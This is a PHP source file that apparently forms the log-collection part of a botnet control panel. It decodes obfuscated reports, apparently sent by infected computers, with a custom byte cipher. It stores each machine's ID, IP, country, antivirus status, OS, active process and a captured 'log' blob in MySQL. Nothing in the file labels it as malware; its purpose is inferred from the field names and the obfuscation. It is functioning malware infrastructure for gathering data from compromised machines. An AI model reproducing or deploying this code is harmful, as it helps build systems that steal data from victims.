<?php
define('USERLOG_MAGIC_NUMBER',0x54464F53);
define('USERLOG_DATA_SIZE',44);
function Log2SQL($bn,$tbl,$id,$cnt,$ip,$data)
{
  if(!($d=@unpack('L1m/L1s',$data))||$d['m']!=USERLOG_MAGIC_NUMBER||($size=$d['s']-USERLOG_DATA_SIZE)<=0)return TRUE;
  $d=@unpack('L1type/S1dt/C1proc/S1av/L1ls/S1ty/S1tm/S1tdw/S1td/S1th/S1tmm/S1ts/S1tms/s1gmt/C1os1/C1os2/L1osb/C1ossp/L1tc/S1lng',($data=DecodeBuffer(substr($data,8))));
  if(!$d||$d['dt']!=USERLOG_DATA_SIZE||$size!=$d['proc']+$d['ls'])return TRUE;
  
  if($d['av'] > 100)$d['av'] = $d['av'] << 16;
  $data='INSERT DELAYED INTO '.$tbl.' SET comp_id=\''.addslashes($id).'\',ip=\''.addslashes($ip).'\',country=\''.addslashes($cnt).'\',time='.time().
        ',type='.$d['type'].',proc=\''.addslashes(substr($data,USERLOG_DATA_SIZE,$d['proc'])).'\',av='.$d['av'].
        ',stime='.fmktime($d['th'],$d['tmm'],$d['ts'],$d['tm'],$d['td'],$d['ty']).
        ',gmt=\''.$d['gmt'].'\',os=\''.$d['os1'].'.'.$d['os2'].'.'.$d['osb'].'.'.$d['ossp'].'\',tc='.$d['tc'].
        ',lng='.$d['lng'].',bn=\''.addslashes($bn).'\',log=\''.addslashes(substr($data,USERLOG_DATA_SIZE+$d['proc'],$d['ls'])).'\'';
  return mysql_query($data);
}
function EncodeBuffer($pData)
{
$pBuf=$pData;
$dwSize=strlen($pData);
for($u=0;$u<$dwSize;$u++)
{
  if($u%2==0)$val=ord($pBuf[$u])-(($u&0xFFFF)*2+10);
  else $val=ord($pBuf[$u])+(($u&0xFFFF)*2+7);
  $pBuf[$u]=chr($val&0xFF);
}
return $pBuf;
}
function DecodeBuffer($pData)
{
$pBuf=$pData;
$dwSize=strlen($pData);
for($u=0;$u<$dwSize;$u++)
{
  if($u%2==0)$val=ord($pBuf[$u])+(($u&0xFFFF)*2+10);
  else $val=ord($pBuf[$u])-(($u&0xFFFF)*2+7);
  $pBuf[$u]=chr($val&0xFF);
}
return $pBuf;
}
?>